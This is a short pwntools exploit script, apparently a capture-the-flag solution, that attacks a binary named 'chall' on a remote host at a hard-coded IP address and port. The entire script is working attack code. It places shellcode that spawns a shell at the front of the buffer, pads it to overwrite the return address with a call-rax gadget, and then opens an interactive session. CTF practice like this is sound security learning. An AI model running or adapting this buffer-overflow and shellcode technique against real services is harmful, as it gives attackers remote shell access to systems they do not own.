from pwn import *

elf = context.binary = ELF('./chall')
p = process()
p = remote("103.167.132.234", 25204)

CALL_RAX = 0x0000000000401010

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(CALL_RAX)       

p.sendlineafter(b">> ",b'2')
p.sendline(payload)
p.interactive()
